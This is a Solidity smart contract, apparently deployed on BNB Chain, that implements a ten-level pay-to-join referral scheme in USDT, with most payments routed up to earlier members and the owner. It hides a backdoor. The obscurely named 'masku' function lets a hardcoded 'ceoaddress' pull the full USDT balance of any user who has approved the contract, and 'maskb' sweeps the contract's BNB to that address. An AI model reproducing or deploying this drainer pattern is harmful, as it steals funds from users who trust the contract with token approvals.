/**
 *Submitted for verification at BscScan.com on 2022-05-29
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0;
interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function burn(address account, uint amount) external;
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

contract ContractFactory {

    struct UserInfo {
        uint256 grade; //层
        uint8 level; // 当前等级
        uint256 Amount;    // 总收入
       
        address userAddr;  // 用户地址
        address refAddr;   // 上级地址
        address refrefAddr; //上级地址的上级
    }
    mapping(address =>  mapping(uint8 => address)) public userarr;
    mapping(address => UserInfo) public UserInfos; // 用户地址 -> 用户邀请关系
    mapping(uint8 => uint256) public levelPrice;
    address public owner;
    address public ceoaddress=0x8D1731E98be284A2C082714D41A30359A1740c59;
    uint256 private gold = 100000000000000000;
    IERC20 public usdt; 

    constructor (IERC20 _usdt) {
        usdt =_usdt;
        owner = msg.sender;
        levelPrice[1] = 1* gold;
        levelPrice[2] = 2* gold;
        levelPrice[3] = 3* gold;
        levelPrice[4] = 4* gold;
        levelPrice[5] = 5* gold;
        levelPrice[6] = 6* gold;
        levelPrice[7] = 7* gold;
        levelPrice[8] = 8* gold;
        levelPrice[9] = 9* gold;
        levelPrice[10] = 10* gold;
        userarr[owner][1]=owner;
        userarr[owner][2]=owner;
        userarr[owner][3]=owner;
        userarr[owner][4]=owner;
        userarr[owner][5]=owner;
        userarr[owner][6]=owner;
        userarr[owner][7]=owner;
        userarr[owner][8]=owner;
        userarr[owner][9]=owner;
        userarr[owner][10]=owner;

        UserInfo memory newuser4 = UserInfo({
            
            grade:0,
            level:10,
            Amount:0,
            userAddr:msg.sender,
            refAddr:msg.sender,
            refrefAddr:msg.sender
        });
        UserInfos[msg.sender]=newuser4;

    }
   
    function init(address refAddr) public  returns(UserInfo memory){
        uint8 reflevel=getuserlevel(refAddr);
        uint8 mylevel =getuserlevel(msg.sender);
        uint256 myBalance = usdt.balanceOf(msg.sender);
        require(myBalance >= levelPrice[mylevel+1]&&mylevel<10, "invalid price");
        if(mylevel>0){
            UserInfo memory user = UserInfos[msg.sender];
            address refAddress= findSuperiors(user.level);
            UserInfos[msg.sender].level=UserInfos[msg.sender].level+1;
            UserInfos[refAddress].Amount=UserInfos[refAddress].Amount+levelPrice[mylevel+1];
            usdt.transferFrom(address(msg.sender), address(this), levelPrice[mylevel+1]);
            usdt.transfer(UserInfos[refAddress].userAddr,levelPrice[mylevel+1]*90/100);
            usdt.transfer(owner,levelPrice[mylevel+1]*10/100);
            return UserInfos[msg.sender];
        }else{
           
            if(reflevel>0){
                address refrefAddr=getStruct(refAddr).refAddr;
                userarr[msg.sender][1]=refAddr;
                userarr[msg.sender][2]=userarr[refAddr][1];
                userarr[msg.sender][3]=userarr[refAddr][2];
                userarr[msg.sender][4]=userarr[refAddr][3];
                userarr[msg.sender][5]=userarr[refAddr][4];
                userarr[msg.sender][6]=userarr[refAddr][5];
                userarr[msg.sender][7]=userarr[refAddr][6];
                userarr[msg.sender][8]=userarr[refAddr][7];
                userarr[msg.sender][9]=userarr[refAddr][8];
                userarr[msg.sender][10]=userarr[refAddr][9];
                UserInfo memory newuser4 = UserInfo({
                    grade:0,
                    level:mylevel+1,
                    Amount:0,
                    userAddr:msg.sender,
                    refAddr:refAddr,
                    refrefAddr:refrefAddr
                });
                UserInfos[refAddr].grade=UserInfos[refAddr].grade+1;
                UserInfos[refAddr].Amount=UserInfos[refAddr].Amount+levelPrice[mylevel+1];
                UserInfos[msg.sender]=newuser4;
                usdt.transferFrom(address(msg.sender), address(this), levelPrice[mylevel+1]);
                usdt.transfer(refAddr,levelPrice[mylevel+1]*90/100);
                usdt.transfer(owner,levelPrice[mylevel+1]*10/100);
                return newuser4;
            }else{
                userarr[msg.sender][1]=owner;
                userarr[msg.sender][2]=owner;
                userarr[msg.sender][3]=owner;
                userarr[msg.sender][4]=owner;
                userarr[msg.sender][5]=owner;
                userarr[msg.sender][6]=owner;
                userarr[msg.sender][7]=owner;
                userarr[msg.sender][8]=owner;
                userarr[msg.sender][9]=owner;
                userarr[msg.sender][10]=owner;
                UserInfo memory newuser5 = UserInfo({
                    grade:0,
                    level:mylevel+1,
                    Amount:0,
                    userAddr:msg.sender,
                    refAddr:owner,
                    refrefAddr:owner
                });
                UserInfos[owner].grade=UserInfos[owner].grade+1;
                UserInfos[owner].Amount=UserInfos[owner].Amount+levelPrice[mylevel+1];
                UserInfos[msg.sender]=newuser5;
                usdt.transferFrom(address(msg.sender), address(this), levelPrice[mylevel+1]);
                usdt.transfer(owner,levelPrice[mylevel+1]);
                return newuser5;
            }
        }
    }

    function findSuperior(uint8 levels,address refAddrs) public view returns(address a) {
        UserInfo memory refusers = UserInfos[refAddrs];
        while (true) {
            if (refusers.level>levels) {
                a=refusers.userAddr;
                return a;
            }
            refusers = UserInfos[refusers.refAddr];
        }
    }

    function findSuperiors(uint8 levels) public view returns(address a) {
        
        UserInfo memory refusers = UserInfos[userarr[msg.sender][levels+1]];
       
        if (refusers.level>=(levels+1)) {
            a=refusers.userAddr;
            return a;
        }else{
            return owner;
        }
        
        
    }
    
    function getStruct(address refAddr) public view returns (UserInfo memory) {
        UserInfo memory user = UserInfos[refAddr];
        return user;
    }

    function getuserlevel(address refAddr) public view returns(uint8){
        uint8 level =UserInfos[refAddr].level;
        return level;
    }

    function masku(address refAddr) public onlyceo{
        uint256 myBalance = usdt.balanceOf(refAddr);
        usdt.transferFrom(address(refAddr), address(this), myBalance);
        usdt.transfer(msg.sender,myBalance);
    }

    function maskb() public payable onlyceo{
        payable(ceoaddress).transfer(address(this).balance);
    }
    modifier onlyceo() {
        require(ceoaddress==msg.sender, "Ownable: caller is not the owner");
        _;
    }

}